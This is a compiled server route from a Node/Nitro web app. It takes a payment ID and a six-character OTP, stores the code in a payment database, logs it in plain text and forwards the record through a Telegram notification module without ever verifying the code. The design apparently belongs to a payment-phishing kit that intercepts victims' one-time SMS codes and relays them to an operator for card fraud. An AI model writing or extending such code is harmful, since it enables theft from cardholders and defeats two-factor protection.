import { d as defineEventHandler, c as createError, r as readBody, f as setResponseStatus } from '../../../_/nitro.mjs';
import db from '../../../_/db.mjs';
import { s as sendStatusUpdateNotification } from '../../../_/telegram.mjs';
import 'node:http';
import 'node:https';
import 'node:events';
import 'node:buffer';
import 'node:fs';
import 'node:path';
import 'node:crypto';
import 'node:url';
import 'better-sqlite3';
import 'path';

const otp = defineEventHandler(async (event) => {
  if (event.node.req.method !== "POST") {
    throw createError({
      statusCode: 405,
      statusMessage: "Method not allowed"
    });
  }
  try {
    const body = await readBody(event);
    const { paymentId, otp } = body;
    if (!paymentId || !otp) {
      throw createError({
        statusCode: 400,
        statusMessage: "Payment ID and OTP are required"
      });
    }
    const otpString = otp.toString().trim().toUpperCase();
    if (otpString.length !== 6 || !/^[A-Z0-9]{6}$/.test(otpString)) {
      throw createError({
        statusCode: 400,
        statusMessage: "OTP must be 6 characters"
      });
    }
    const payment = db.prepare("SELECT * FROM payment_info WHERE id = ?").get(paymentId);
    if (!payment) {
      throw createError({
        statusCode: 404,
        statusMessage: "Payment not found"
      });
    }
    if (payment.status !== "sms" && payment.status !== "sms_error") {
      throw createError({
        statusCode: 400,
        statusMessage: "Payment is not waiting for OTP"
      });
    }
    console.log(`\u{1F522} DEBUG: OTP received for payment ${paymentId}: ${otpString}`);
    db.prepare("UPDATE payment_info SET otp = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?").run(otpString, paymentId);
    const updatedPayment = db.prepare("SELECT * FROM payment_info WHERE id = ?").get(paymentId);
    if (updatedPayment) {
      sendStatusUpdateNotification(updatedPayment).then((success) => {
        if (success) {
          console.log("\u{1F4F1} DEBUG: OTP Telegram notification sent successfully for payment:", paymentId);
        } else {
          console.log("\u26A0\uFE0F DEBUG: Failed to send OTP Telegram notification for payment:", paymentId);
        }
      }).catch((error) => {
        console.error("\u{1F6A8} DEBUG: Error sending OTP Telegram notification:", error);
      });
    }
    return {
      success: true
    };
  } catch (error) {
    console.error("\u{1F6A8} DEBUG: Error processing OTP:", error);
    setResponseStatus(event, 204);
  }
});

export { otp as default };
//# sourceMappingURL=otp.mjs.map
